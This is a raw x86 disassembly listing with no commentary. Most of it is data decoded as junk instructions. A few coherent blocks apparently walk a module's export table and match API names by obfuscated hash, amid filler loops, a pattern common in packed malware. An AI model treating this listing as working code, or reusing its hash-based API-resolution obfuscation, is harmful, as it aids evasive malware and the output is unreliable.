  41193d:	mov    ecx,0xea287b3a
  411942:	ins    DWORD PTR es:[edi],dx
  411943:	xchg   edx,eax
  411944:	sub    dh,ah
  411946:	fidivr WORD PTR [ebx]
  411948:	cmp    BYTE PTR [ebp+0x33],al
  41194b:	repnz (bad) 
  41194d:	ja     0x4118f9
  41194f:	add    dl,0x7c
  411952:	mov    dl,0x3a
  411954:	ss pop ds
  411956:	(bad)  
  411957:	(bad)  
  411958:	pusha  
  411959:	fldenv [ecx+eiz*8+0x45b5df84]
  411960:	test   DWORD PTR [ebp-0x2516fc33],ecx
  411966:	retf   
  411967:	aas    
  411968:	sbb    ch,BYTE PTR [edi]
  41196a:	jg     0x411990
  41196c:	fs pop eax
  41196e:	pop    eax
  41196f:	mov    bh,0xe7
  411971:	loopne 0x4118f5
  411973:	(bad)
  411977:	sub    eax,0x838ecd5a
  41197c:	pop    ecx
  41197d:	dec    esp
  41197e:	mov    edx,0xc0eaf67
  411983:	cdq    
  411984:	data16 gs jbe 0x4119ed
  411988:	jl     0x411992
  41198a:	mov    al,BYTE PTR gs:[edx]
  41198d:	sub    ebp,edx
  41198f:	sub    al,0x8b
  411991:	inc    edx
  411992:	loope  0x411915
  411994:	scas   al,BYTE PTR es:[edi]
  411995:	mov    edx,0x765c8359
  41199a:	sahf   
  41199b:	stos   BYTE PTR es:[edi],al
  41199c:	test   al,0xa3
  41199e:	scas   al,BYTE PTR es:[edi]
  41199f:	retf   
  4119a0:	sti    
  4119a1:	aaa    
  4119a2:	push   ds
  4119a3:	ror    bh,0xd4
  4119a6:	stos   DWORD PTR es:[edi],eax
  4119a7:	pop    ss
  4119a8:	fimul  WORD PTR [eax-0x5c733ca2]
  4119ae:	cdq    
  4119af:	repnz mov eax,ds:0xfee514ff
  4119b5:	fisubr WORD PTR [edi+0x6ff9f916]
  4119bb:	inc    edi
  4119bc:	fsubp  st(5),st
  4119be:	jbe    0x411a1c
  4119c0:	pushf  
  4119c1:	out    dx,eax
  4119c2:	adc    DWORD PTR [esi+0x69],0xffffffb4
  4119c6:	and    eax,0x143f373a
  4119cb:	adc    DWORD PTR [esi-0x463cf9b6],ebx
  4119d1:	inc    edi
  4119d2:	pusha  
  4119d3:	fisub  WORD PTR [edx+0x4ec1f5da]
  4119d9:	call   0x58f183e7
  4119de:	jnp    0x411997
  4119e0:	push   edi
  4119e1:	aad    0xc
  4119e3:	push   0xffffffd6
  4119e5:	add    dh,BYTE PTR [esi]
  4119e7:	out    0x12,eax
  4119e9:	int3   
  4119ea:	cmc    
  4119eb:	mov    dh,0x72
  4119ed:	sbb    edx,ebp
  4119ef:	sub    eax,0xee451ae4
  4119f4:	xor    eax,0x56363017
  4119f9:	ja     0x411a33
  4119fb:	jge    0x411a56
  4119fd:	retf   
  4119fe:	xchg   ebx,eax
  4119ff:	loope  0x411a51
  411a01:	loope  0x41198d
  411a03:	inc    edi
  411a04:	push   ebp
  411a05:	jae    0x411997
  411a07:	jo     0x411a5f
  411a09:	push   ebx
  411a0a:	jns    0x411a79
  411a0c:	sub    ch,BYTE PTR [esi+0x3a]
  411a0f:	pushf  
  411a10:	mov    ch,0x10
  411a12:	dec    eax
  411a13:	adc    ecx,DWORD PTR cs:[edx+0x4c]
  411a17:	out    0xe0,al
  411a19:	stc    
  411a1a:	mov    bl,BYTE PTR [edi+0x64]
  411a1d:	cld    
  411a1e:	lock neg BYTE PTR [esp+eiz*4+0x22]
  411a23:	sbb    al,0x34
  411a25:	mov    dl,0x52
  411a27:	rcl    DWORD PTR [ecx-0x514aeec1],0x3e
  411a2e:	hlt    
  411a2f:	sti    
  411a30:	add    al,0x7f
  411a32:	and    al,BYTE PTR [ebp+0x604c1a81]
  411a38:	jbe    0x411a80
  411a3a:	cld    
  411a3b:	pop    edi
  411a3d:	or     esi,ebx
  411a3f:	xchg   esi,ecx
  411a41:	sub    edx,edi
  411a43:	xor    ecx,DWORD PTR ds:0x4346f7
  411a49:	xor    esi,esi
  411a4b:	adc    DWORD PTR ds:0x434677,edi
  411a51:	mov    DWORD PTR [ebp-0x28],esi
  411a54:	mov    DWORD PTR [ebp-0x2c],esi
  411a57:	dec    DWORD PTR ds:0x43474f
  411a5d:	mov    DWORD PTR [ebp-0x14],esi
  411a60:	mov    DWORD PTR [ebp-0x8],esi
  411a63:	mov    ecx,DWORD PTR [ebp-0x18]
  411a66:	add    DWORD PTR ds:0x43474f,0x3520
  411a70:	xor    ecx,eax
  411a72:	xor    edi,edi
  411a74:	add    ecx,ebx
  411a76:	mov    DWORD PTR [ebp-0x20],ecx
  411a79:	mov    DWORD PTR ds:0x4346b7,ebx
  411a7f:	mov    eax,DWORD PTR [ebp-0x20]
  411a82:	mov    DWORD PTR ds:0x43467f,0x2abf
  411a8c:	je     0x4122b7
  411a92:	adc    DWORD PTR ds:0x43466b,0x60fd
  411a9c:	mov    eax,DWORD PTR [ebp-0x4]
  411a9f:	adc    DWORD PTR ds:0x4346d3,0x6e6
  411aa9:	xor    eax,0x7510851
  411aae:	or     DWORD PTR ds:0x434743,0x4346fb
  411ab8:	add    eax,ebx
  411aba:	mov    DWORD PTR ds:0x434793,0x35f1
  411ac4:	cmp    edi,eax
  411ac6:	jne    0x411c5a
  411acc:	sbb    DWORD PTR ds:0x434673,0x434667
  411ad6:	push   DWORD PTR [ebp+0x8]
  411ad9:	or     DWORD PTR ds:0x43478f,0x43474b
  411ae3:	call   0x4104be
  411ae8:	and    ecx,DWORD PTR ds:0x4346cf
  411aee:	mov    DWORD PTR [ebp-0x20],eax
  411af1:	mov    eax,DWORD PTR [ebp-0x4]
  411af4:	mov    ecx,DWORD PTR [ebp-0x20]
  411af7:	and    DWORD PTR ds:0x434737,0x0
  411b01:	mov    esi,DWORD PTR ds:0x434737
  411b07:	inc    esi
  411b08:	mov    DWORD PTR ds:0x434737,esi
  411b0e:	cmp    DWORD PTR ds:0x434737,0x1e
  411b15:	jne    0x411b26
  411b1b:	push   0x1cd9
  411b20:	call   DWORD PTR ds:0x4132b4
  411b26:	cmp    DWORD PTR ds:0x434737,0x18
  411b2d:	jb     0x411b01
  411b33:	mov    esi,0x7510851
  411b38:	xor    eax,esi
  411b3a:	add    eax,ebx
  411b3c:	cmp    ecx,eax
  411b3e:	je     0x411e9b
  411b44:	or     DWORD PTR ds:0x434737,0x4346f7
  411b4e:	push   DWORD PTR [ebp-0x20]
  411b51:	push   DWORD PTR [ebp+0x8]
  411b54:	sub    DWORD PTR ds:0x4346b7,0x434667
  411b5e:	call   0x404d31
  411b63:	movzx  ecx,WORD PTR ds:0x434737
  411b6a:	and    ecx,DWORD PTR ds:0x43470b
  411b70:	mov    DWORD PTR ds:0x434737,ecx
  411b76:	mov    DWORD PTR [ebp-0x14],eax
  411b79:	mov    DWORD PTR ds:0x43478f,0x13
  411b83:	cmp    DWORD PTR ds:0x43478f,0x0
  411b8a:	je     0x411bc6
  411b90:	cmp    DWORD PTR ds:0x43478f,0x22
  411b97:	jne    0x411bad
  411b9d:	push   0x434890
  411ba2:	push   0x434835
  411ba7:	call   DWORD PTR ds:0x4130e4
  411bad:	xor    eax,eax
  411baf:	or     eax,DWORD PTR ds:0x43478f
  411bb5:	dec    eax
  411bb6:	mov    ds:0x43478f,eax
  411bbb:	jmp    0x411b83
  411bc0:	add    DWORD PTR ds:0x43466b,edx
  411bc6:	mov    eax,DWORD PTR [ebp-0x4]
  411bc9:	mov    DWORD PTR ds:0x43474b,0x10
  411bd3:	cmp    DWORD PTR ds:0x43474b,0x0
  411bda:	je     0x411c1c
  411be0:	cmp    DWORD PTR ds:0x43474b,0x1b
  411be7:	jne    0x411c0a
  411bed:	push   DWORD PTR [ebp-0x20]
  411bf0:	push   0x4372
  411bf5:	push   0x434955
  411bfa:	push   0x434969
  411bff:	push   0x7ff3
  411c04:	call   DWORD PTR ds:0x4130e8
  411c0a:	mov    ecx,DWORD PTR ds:0x43474b
  411c10:	dec    ecx
  411c11:	mov    DWORD PTR ds:0x43474b,ecx
  411c17:	jmp    0x411bd3
  411c1c:	mov    ecx,DWORD PTR [ebp-0x14]
  411c1f:	xor    eax,esi
  411c21:	add    eax,ebx
  411c23:	cmp    ecx,eax
  411c25:	je     0x411e9b
  411c2b:	mov    eax,DWORD PTR [ebp-0x14]
  411c2e:	mov    eax,DWORD PTR [eax+0x18]
  411c31:	mov    DWORD PTR [ebp-0x20],eax
  411c34:	mov    eax,DWORD PTR [ebp-0x14]
  411c37:	mov    ecx,DWORD PTR [ebp+0x8]
  411c3a:	add    ecx,DWORD PTR [eax+0x20]
  411c3d:	mov    DWORD PTR [ebp-0x28],ecx
  411c40:	mov    eax,DWORD PTR [ebp-0x14]
  411c43:	mov    ecx,DWORD PTR [ebp+0x8]
  411c46:	add    ecx,DWORD PTR [eax+0x24]
  411c49:	mov    DWORD PTR [ebp-0x2c],ecx
  411c4c:	mov    eax,DWORD PTR [ebp-0x14]
  411c4f:	mov    ecx,DWORD PTR [ebp+0x8]
  411c52:	add    ecx,DWORD PTR [eax+0x1c]
  411c55:	xor    esi,esi
  411c57:	mov    DWORD PTR [ebp-0x14],ecx
  411c5a:	mov    eax,DWORD PTR [ebp-0x28]
  411c5d:	mov    ecx,DWORD PTR [ebp+0x8]
  411c60:	jmp    0x411e60
  411c65:	scas   al,BYTE PTR es:[edi]
  411c66:	repz push esi
  411c68:	add    dl,BYTE PTR [ebx-0x5d]
  411c6b:	push   0x73
  411c6d:	out    dx,eax
  411c6e:	sub    DWORD PTR [ecx+0x2f],esp
  411c71:	xor    esp,DWORD PTR es:[ebp+0x12]
  411c75:	aad    0x56
  411c77:	jle    0x411cf7
  411c79:	pop    ecx
  411c7a:	jg     0x411cfa
  411c7c:	jle    0x411cc4
  411c7e:	jle    0x411cb2
  411c80:	and    DWORD PTR [edi+0x60755779],ebx
  411c86:	xor    ecx,DWORD PTR [edx]
  411c88:	push   ds
  411c89:	repz push esp
  411c8b:	jnp    0x411c97
  411c8d:	push   0x25386982
  411c92:	leave  
  411c93:	cmp    ecx,DWORD PTR [eax+0x11cbf1b5]
  411c99:	fcomp  st(0)
  411c9b:	es mov dh,0x31
  411c9e:	je     0x411c7b
  411ca0:	jmp    0x8c4ae5fc
  411ca5:	mov    edx,0x1a70b43
  411caa:	popa   
  411cab:	test   eax,0x42e79bca
  411cb0:	sbb    esp,ebx
  411cb2:	dec    esi
  411cb3:	dec    esp
  411cb4:	hlt    
  411cb5:	in     al,dx
  411cb6:	and    al,0xb1
  411cb8:	pop    es
  411cb9:	jo     0x411c99
  411cbb:	scas   eax,DWORD PTR es:[edi]
  411cbc:	sbb    eax,0xee01f9c7
  411cc1:	ja     0x411cf8
  411cc3:	hlt    
  411cc4:	lahf   
  411cc5:	(bad)  
  411cc6:	retf   
  411cc7:	stos   BYTE PTR es:[edi],al
  411cc8:	in     eax,dx
  411cc9:	inc    edi
  411cca:	sbb    ch,bh
  411ccc:	and    ebx,edi
  411cce:	idiv   DWORD PTR [ebp-0x1308c4a8]
  411cd4:	pop    edi
  411cd5:	cmp    esp,eax
  411cd7:	mov    al,0xd7
  411cd9:	cwde   
  411cda:	mov    ecx,DWORD PTR [edx+0x1b]
  411cdd:	imul   edx,DWORD PTR ds:0x2076be0d,0x4c0fbd4
  411ce7:	mov    eax,ds:0x7b044718
  411cec:	adc    al,0x71
  411cee:	stc    
  411cef:	adc    DWORD PTR [edi-0x42b166ba],eax
  411cf5:	push   esi
  411cf6:	jge    0x411d75
  411cf8:	not    BYTE PTR [ebx-0x31]
  411cfb:	sbb    eax,0x18cfac2
  411d00:	mov    cl,0x1c
  411d02:	test   al,0x63
  411d04:	xchg   esp,eax
  411d05:	pop    esp
  411d06:	into   
  411d07:	add    eax,0xf238be3
  411d0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d0d:	push   ebx
  411d0e:	push   es
  411d0f:	push   esi
  411d10:	mov    dl,0x26
  411d12:	into   
  411d13:	sbb    DWORD PTR [edi+edx*2+0x58b5d0ad],esp
  411d1a:	sahf   
  411d1b:	sub    DWORD PTR [esp+esi*8],eax
  411d1e:	mov    esp,0xa9e7b180
  411d23:	and    ch,BYTE PTR [eax-0x43]
  411d26:	adc    al,0x41
  411d28:	adc    ebp,DWORD PTR [esi+0x6f]
  411d2b:	and    al,0xb
  411d2d:	shl    BYTE PTR [ebx-0x55ad123d],cl
  411d33:	icebp  
  411d34:	nop
  411d35:	xchg   DWORD PTR [edx+eiz*2+0x6bebff0d],eax
  411d3c:	fwait
  411d3d:	sar    DWORD PTR [ebx-0x3af8c3be],0x4a
  411d44:	test   eax,0x3217e838
  411d49:	fdiv   QWORD PTR [edx]
  411d4b:	and    ecx,DWORD PTR [esi]
  411d4d:	shl    BYTE PTR [bp+si+0x3c47],0x0
  411d53:	and    ah,BYTE PTR [ecx]
  411d55:	xchg   BYTE PTR [ebx-0x34],cl
  411d58:	xor    DWORD PTR [ebp+0x657f25b],esi
  411d5e:	add    DWORD PTR [ecx+0x5fc9f8a0],ecx
  411d64:	lock pop eax
  411d66:	mov    eax,DWORD PTR [edi+0x77]
  411d69:	jecxz  0x411d11
  411d6b:	and    al,0xd2
  411d6d:	and    edi,DWORD PTR ds:0x1344e578
  411d73:	xlat   BYTE PTR ds:[ebx]
  411d74:	sbb    ebx,ebx
  411d76:	xchg   edi,eax
  411d77:	stos   BYTE PTR es:[edi],al
  411d78:	(bad)  
  411d79:	adc    al,0xab
  411d7b:	mov    fs,WORD PTR [ecx-0x78b889b4]
  411d81:	sub    DWORD PTR [eax+0xddf3989],eax
  411d87:	leave  
  411d88:	or     BYTE PTR [ebx],dh
  411d8a:	pop    es
  411d8b:	xor    eax,0x84c10932
  411d90:	ja     0x411d98
  411d92:	mov    ds:0xc6e5f489,al
  411d97:	ror    DWORD PTR [esi+0x5a],1
  411d9a:	jbe    0x411d8e
  411d9c:	xchg   edi,eax
  411d9d:	test   eax,0x37b8df0c
  411da2:	call   0x6467542e
  411da7:	stos   BYTE PTR es:[edi],al
  411da8:	in     eax,dx
  411da9:	dec    edx
  411daa:	sbb    BYTE PTR [esi+eax*8-0x2a],bl
  411dae:	xor    DWORD PTR [ebp-0x4b],esp
  411db1:	jne    0x411e09
  411db3:	or     al,0x5c
  411db5:	xlat   BYTE PTR ds:[ebx]
  411db6:	test   BYTE PTR [ebp+0x1e],cl
  411db9:	bound  eax,QWORD PTR [edi+0x23d6c2a8]
  411dbf:	mov    esp,0x3940f48c
  411dc4:	cmc    
  411dc5:	pop    ss
  411dc6:	pop    es
  411dc7:	sub    edi,DWORD PTR [ebx+0x4]
  411dca:	outs   dx,DWORD PTR ds:[esi]
  411dcb:	jp     0x411d99
  411dcd:	daa    
  411dce:	sbb    esi,DWORD PTR [ebp-0x38fadbd7]
  411dd4:	push   ecx
  411dd5:	xchg   edx,eax
  411dd6:	or     dh,BYTE PTR [ecx+0x2c9248e3]
  411ddc:	sub    DWORD PTR [ecx],ebx
  411dde:	popf   
  411ddf:	mov    ds,WORD PTR [edi+0x44]
  411de2:	mov    esi,0xee1ab3fb
  411de7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411de8:	push   edi
  411de9:	mov    bh,0xcc
  411deb:	and    bh,BYTE PTR [edi]
  411ded:	lea    eax,[edx]
  411def:	and    BYTE PTR [edx-0x2b],0x6
  411df3:	mov    al,ds:0xa5cd8960
  411df8:	xchg   DWORD PTR ds:0x8928d5b3,ebx
  411dfe:	inc    esi
  411dff:	xchg   DWORD PTR [edi-0x18a63514],esi
  411e05:	jecxz  0x411df3
  411e07:	cwde   
  411e08:	mov    DWORD PTR [edx+ebx*4],0xfa6d7cb9
  411e0f:	pop    ss
  411e10:	mov    edx,0xb244824b
  411e15:	cdq    
  411e16:	js     0x411dc8
  411e18:	fwait
  411e19:	imul   ebp,DWORD PTR [edi+edi*4],0xffffffe4
  411e1d:	jle    0x411e32
  411e1f:	mov    ch,0x2a
  411e21:	jmp    0x411e69
  411e23:	pop    eax
  411e24:	sbb    ebp,DWORD PTR [esi+eax*8-0x788a21af]
  411e2b:	sbb    BYTE PTR [ebp+0x6d7a8a42],0xce
  411e32:	pusha  
  411e33:	dec    edx
  411e34:	test   eax,0x396f5508
  411e39:	push   ds
  411e3a:	loop   0x411dcc
  411e3c:	ror    BYTE PTR [edi],0x39
  411e3f:	rcl    esi,0x3a
  411e42:	dec    ecx
  411e43:	inc    edx
  411e44:	cdq    
  411e45:	mov    al,ds:0xf9ff375e
  411e4a:	in     al,0xad
  411e4c:	inc    eax
  411e4d:	lahf   
  411e4e:	jecxz  0x411e7d
  411e50:	call   0xfa1a:0xa40150c3
  411e57:	cmp    DWORD PTR [edx],edx
  411e59:	mov    bl,0x27
  411e5b:	sbb    DWORD PTR [edi+0x3ebfe4b],ebx
  411e61:	or     al,0xb8
  411e63:	lea    eax,[ebp-0x8]
  411e66:	mov    DWORD PTR [ebp-0x30],ecx
  411e69:	push   eax
  411e6a:	push   DWORD PTR [ebp-0x30]
  411e6d:	push   DWORD PTR [ebp+0xc]
  411e70:	call   0x402e72
  411e75:	mov    eax,DWORD PTR [ebp-0x4]
  411e78:	mov    ecx,DWORD PTR [ebp-0x8]
  411e7b:	xor    eax,0x7510851
  411e80:	add    eax,ebx
  411e82:	cmp    ecx,eax
  411e84:	jne    0x411ea7
  411e8a:	mov    eax,DWORD PTR [ebp-0x20]
  411e8d:	inc    edi
  411e8e:	cmp    edi,eax
  411e90:	jb     0x411a92
  411e96:	jmp    0x4122b7
  411e9b:	mov    eax,DWORD PTR [ebp-0x4]
  411e9e:	xor    eax,esi
  411ea0:	add    eax,ebx
  411ea2:	jmp    0x412c05
  411ea7:	mov    eax,DWORD PTR [ebp-0x2c]
  411eaa:	movzx  eax,WORD PTR [eax+edi*2]
  411eae:	jmp    0x4120ae
  411eb3:	retf   
  411eb4:	dec    ebp
  411eb5:	add    DWORD PTR [edi+0x6d757391],esi
  411ebb:	je     0x411ea0
  411ebd:	jge    0x411f08
  411ebf:	mov    esp,0x30b2de35
  411ec4:	push   eax
  411ec5:	jle    0x411f45
  411ec7:	pop    ecx
  411ec8:	jg     0x411f48
  411eca:	jle    0x411e8c
  411ecc:	or     DWORD PTR [esi-0x43],ebx
  411ecf:	or     al,0x40
  411ed1:	jne    0x411f1d
  411ed3:	imul   eax,DWORD PTR [esi-0x3e],0xdaadb9d1
  411eda:	push   cs
  411edb:	arpl   WORD PTR [eax],di
  411edd:	jmp    DWORD PTR [edi+0xfaa0185]
  411ee3:	sar    DWORD PTR [ecx],1
  411ee5:	pop    edi
  411ee6:	inc    ebx
  411ee7:	jge    0x411e78
  411ee9:	imul   edi,DWORD PTR [ebp-0x6aec3cce],0xffffff81
  411ef0:	inc    eax
  411ef1:	or     ecx,DWORD PTR [edx+0x3767a23a]
  411ef7:	stos   DWORD PTR es:[edi],eax
  411ef8:	ret    0x9930
  411efb:	int3   
  411efc:	ins    BYTE PTR es:[edi],dx
  411efd:	mov    edx,0xcb1ac6fb
  411f02:	(bad)  
  411f03:	and    edi,esp
  411f05:	mov    bh,0x16
  411f07:	push   ds
  411f08:	mov    ecx,0x1301c60d
  411f0d:	test   al,0xf3
  411f0f:	mul    esi
  411f11:	lock push edi
  411f13:	xchg   DWORD PTR [edx+eiz*2],edx
  411f16:	adc    edx,DWORD PTR ds:0x9550eae2
  411f1c:	fidiv  WORD PTR [esi]
  411f1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f1f:	das    
  411f20:	mov    al,0xb
  411f22:	and    esi,esi
  411f24:	inc    ebx
  411f25:	in     al,dx
  411f26:	inc    BYTE PTR [esi+0x5]
  411f29:	sbb    edx,DWORD PTR [edi-0x1a710897]
  411f2f:	cli    
  411f30:	ficomp WORD PTR [esi]
  411f32:	outs   dx,DWORD PTR ds:[esi]
  411f33:	fsubr  QWORD PTR [edx+eiz*4+0x40]
  411f37:	stos   BYTE PTR es:[edi],al
  411f38:	add    eax,0x82da237c
  411f3d:	loopne 0x411f19
  411f3f:	dec    DWORD PTR [esi+0x61]
  411f42:	ror    BYTE PTR [ebx+0x4eed0245],0xa8
  411f49:	add    al,0x5b
  411f4b:	in     al,0xe1
  411f4d:	or     cl,dh
  411f4f:	inc    ebx
  411f50:	call   0xff33:0x36e926f1
  411f57:	sbb    eax,0x9d2467a0
  411f5c:	jp     0x411f63
  411f5e:	scas   eax,DWORD PTR es:[edi]
  411f5f:	lds    edx,FWORD PTR [ebx]
  411f61:	into   
  411f62:	(bad)  
  411f63:	pop    ebp
  411f64:	cmp    BYTE PTR [ecx-0x4e],al
  411f67:	iret   
  411f68:	stos   DWORD PTR es:[edi],eax
  411f69:	sub    bh,ch
  411f6b:	jns    0x411f56
  411f6d:	inc    edi
  411f6e:	and    esp,ecx
  411f70:	adc    bh,ch
  411f72:	lock dec eax
  411f74:	mov    ds:0x5958e609,al
  411f79:	cmp    DWORD PTR [ebp+0x483d8ad4],ebx
  411f7f:	push   cs
  411f80:	repz lahf 
  411f82:	mov    esp,0x984585c6
  411f87:	ret    
  411f88:	out    0xc1,eax
  411f8a:	adc    WORD PTR [esi-0x6bb09f11],di
  411f91:	cmp    al,0x60
  411f93:	xchg   ebx,eax
  411f94:	inc    edx
  411f95:	retf   0xeeba
  411f98:	sahf   
  411f99:	and    BYTE PTR ds:0xa37b44e8,0xd8
  411fa0:	add    BYTE PTR [esi+esi*1],0x68
  411fa4:	mov    esp,DWORD PTR [ecx]
  411fa6:	dec    esp
  411fa7:	mov    ecx,0xb568c9b0
  411fac:	pop    esp
  411fad:	sbb    BYTE PTR [ebp-0x37],0xb7
  411fb1:	xlat   BYTE PTR ds:[ebx]
  411fb2:	adc    edi,DWORD PTR [ebp+0x2d238e0f]
  411fb8:	je     0x411f7c
  411fba:	inc    esi
  411fbb:	ror    BYTE PTR [edi+0x50],1
  411fbe:	adc    DWORD PTR [esi],esp
  411fc0:	mov    ds:0x84b77120,al
  411fc5:	lock repnz shr BYTE PTR [eax+eiz*1],1
  411fca:	mov    eax,0xf49e2a63
  411fcf:	dec    esp
  411fd0:	xor    al,BYTE PTR [edx]
  411fd2:	or     al,0x72
  411fd4:	aas    
  411fd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411fd6:	xchg   DWORD PTR [edi],ebp
  411fd8:	sar    BYTE PTR [ebx+0x1b],1
  411fdb:	add    al,0x68
  411fdd:	mov    cl,0x70
  411fdf:	imul   esp,DWORD PTR [edi-0xa6c1360],0xaea6844b
  411fe9:	mov    dl,0xa5
  411feb:	mov    edi,0x9bb76859
  411ff0:	mov    eax,ds:0xfd65fd36
  411ff5:	adc    esi,DWORD PTR [eax-0x8]
  411ff8:	jb     0x412000
  411ffa:	loope  0x411fef
  411ffc:	or     ecx,ebx
  411ffe:	adc    al,0x98
  412000:	mov    eax,ds:0x5a4a2ee7
  412005:	in     al,0x6f
  412007:	stc    
  412008:	push   esp
  412009:	mov    ecx,0xb41ca1c
  41200e:	(bad)  
  41200f:	cld    
  412010:	ins    DWORD PTR es:[edi],dx
  412011:	xor    edi,DWORD PTR [edi+eiz*8]
  412014:	jnp    0x411ff3
  412016:	in     al,dx
  412017:	(bad)  
  412019:	mov    dh,0x25
  41201b:	or     ah,BYTE PTR [ebp+0x7f]
  41201e:	imul   edx,DWORD PTR [ebx],0x8eb13867
  412024:	mov    dh,BYTE PTR [eax-0x31]
  412027:	add    al,0xe1
  41202a:	push   ds
  41202b:	mov    ebp,0xe8d17da8
  412030:	xchg   edx,eax
  412031:	out    dx,eax
  412032:	adc    al,0xdd
  412034:	sub    ebp,DWORD PTR [edx+0x5a78d711]
  41203a:	dec    DWORD PTR [esi-0xa]
  41203d:	in     al,0xd5
  41203f:	sti    
  412040:	pusha  
  412041:	int    0x7
  412043:	cmp    eax,DWORD PTR [ebp+edx*2-0x5c6a9ac1]
  41204a:	jle    0x4120bc
  41204c:	mov    cl,0xe1
  41204e:	ror    BYTE PTR [ebp+0x16],1
  412051:	sub    al,0x3e
  412053:	jge    0x4120c7
  412055:	in     eax,dx
  412056:	dec    eax
  412057:	inc    esp
  412058:	dec    DWORD PTR [edi-0x31]
  41205b:	fbstp  TBYTE PTR [esi+ebx*2]
  41205e:	clc    
  41205f:	ror    al,0xdc
  412062:	(bad)  
  412063:	sar    BYTE PTR [edi+eiz*2-0x7b37cfad],cl
  41206a:	outs   dx,BYTE PTR ds:[esi]
  41206b:	push   ebp
  41206c:	mov    ebp,0xd69eb689
  412072:	jne    0x4120d8
  412074:	mov    ah,0xb2
  412076:	lahf   
  412077:	xchg   dh,ch
  412079:	imul   esi,DWORD PTR [edi-0x78],0x7002c1ef
  412080:	sub    DWORD PTR [ebx-0x49afdd0b],0xffffff8a
  412087:	test   cl,0xd6
  41208a:	cmp    ch,BYTE PTR [eax+eiz*2-0x59]
  41208e:	int    0x17
  412090:	cdq    
  412091:	adc    dl,BYTE PTR [esi-0x2b]
  412094:	pop    edx
  412095:	aad    0x67
  412097:	mov    bh,BYTE PTR [ecx-0x1d7b7c3f]
  41209d:	mov    ch,0x91
  41209f:	in     al,0x28
  4120a1:	add    eax,0x97377caa
  4120a6:	repnz repz out dx,al
  4120a9:	sub    eax,0x28e8e6b
  4120ae:	mov    ecx,DWORD PTR [ebp-0x14]
  4120b1:	mov    eax,DWORD PTR [ecx+eax*4]
  4120b4:	jmp    0x4122b4
  4120b9:	cmp    DWORD PTR [ecx+ebx*4+0x69156508],esp
  4120c0:	jne    0x4120eb
  4120c2:	xchg   edx,eax
  4120c3:	mov    al,0xd4
  4120c5:	(bad)  
  4120c6:	out    dx,eax
  4120c7:	ffree  st(4)
  4120c9:	adc    edx,DWORD PTR [edx+0x7e]
  4120cc:	jle    0x412127
  4120ce:	jg     0x41214e
  4120d0:	jle    0x4120a8
  4120d2:	aam    0xc0
  4120d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4120d5:	add    DWORD PTR [ebp+0x2deb6031],0xfe34ffb6
  4120df:	sub    bl,BYTE PTR [ecx-0x7bb45be1]
  4120e5:	sbb    BYTE PTR [ebp+0x24],cl
  4120e8:	rol    DWORD PTR [eax-0x49],cl
  4120eb:	inc    ecx
  4120ec:	xor    esi,esp
  4120ee:	mov    ds:0x99cfcce1,eax
  4120f3:	in     al,0x81
  4120f5:	pop    ebx
  4120f6:	ficomp WORD PTR [edi+0x642986a8]
  4120fc:	and    dh,BYTE PTR [ebp-0x247dd406]
  412102:	and    DWORD PTR [ebp+0x3f75ed07],esi
  412108:	ins    BYTE PTR es:[edi],dx
  412109:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41210b:	xor    eax,0xac8423a7
  412110:	mov    ds:0xc1791ce3,al
  412115:	xchg   ebp,eax
  412116:	arpl   di,bp
  412118:	jecxz  0x41213f
  41211a:	cdq    
  41211b:	lods   al,BYTE PTR ds:[esi]
  41211c:	and    ebx,ebp
  41211e:	inc    edx
  41211f:	sub    BYTE PTR [edx+eax*1],ch
  412122:	inc    ebx
  412123:	loop   0x4120b4
  412125:	cdq    
  412126:	jge    0x412117
  412128:	xchg   DWORD PTR [edx+0x2a],ebx
  41212b:	xchg   esi,eax
  41212c:	int    0x28
  41212e:	jae    0x412108
  412130:	jl     0x41216c
  412132:	add    bh,dl
  412134:	pop    ds
  412135:	jl     0x41215e
  412137:	loope  0x412192
  412139:	jae    0x4121a7
  41213b:	mov    esi,0x79466457
  412140:	jp     0x4121b5
  412142:	push   ebx
  412143:	mov    ecx,0x7609372f
  412148:	outs   dx,DWORD PTR ds:[esi]
  412149:	mov    ds:0xdce5a336,al
  41214e:	jmp    0x3fd4:0xcf47e88
  412155:	mov    dh,0x34
  412157:	dec    esp
  412158:	mov    ebp,0x5c6d2025
  41215d:	js     0x4121d1
  41215f:	out    0x6b,al
  412161:	cmp    cl,bh
  412163:	scas   eax,DWORD PTR es:[edi]
  412164:	ss add eax,0xd009f505
  41216a:	iret   
  41216b:	add    dh,0x76
  41216e:	xchg   DWORD PTR [ecx],eax
  412170:	int3   
  412171:	dec    ecx
  412172:	jbe    0x4121c9
  412174:	add    eax,0x7a77ff32
  412179:	mov    DWORD PTR [ebx-0x1a336aa5],edi
  41217f:	out    0x76,eax
  412181:	cmp    esi,DWORD PTR [eax]
  412183:	push   ebp
  412184:	dec    edx
  412185:	xchg   esi,eax
  412186:	add    ebx,ebx
  412188:	loopne 0x4121c0
  41218a:	jnp    0x412121
  41218c:	inc    esp
  41218d:	xor    eax,0x17b31b56
  412192:	stos   DWORD PTR es:[edi],eax
  412193:	lock xlat BYTE PTR ds:[ebx]
  412195:	shr    bh,0xeb
  412198:	and    al,BYTE PTR [edi+0x60]
  41219b:	and    al,0x1a
  41219d:	scas   eax,DWORD PTR es:[edi]
  41219e:	in     al,dx
  41219f:	in     eax,0xc
  4121a1:	cmp    ah,ch
  4121a3:	not    DWORD PTR [ecx+eiz*2]
  4121a6:	cwde   
  4121a7:	inc    edi
  4121a8:	sub    edx,ebx
  4121aa:	jmp    0x6e8a:0xcd98
  4121b0:	xchg   BYTE PTR [eax+0x6ee694ce],bl
  4121b6:	inc    esp
  4121b7:	outs   dx,DWORD PTR ds:[esi]
  4121b8:	in     eax,0x37
  4121ba:	adc    esp,esi
  4121bc:	jle    0x4121fa
  4121be:	loope  0x41220a
  4121c0:	scas   al,BYTE PTR es:[edi]
  4121c1:	sbb    al,0xc2
  4121c3:	jge    0x41222b
  4121c5:	hlt    
  4121c6:	adc    BYTE PTR [ecx-0x58848791],dl
  4121cc:	cmp    esi,ebp
  4121ce:	xchg   edi,eax
  4121cf:	or     ch,BYTE PTR [eax]
  4121d1:	enter  0x67bf,0x90
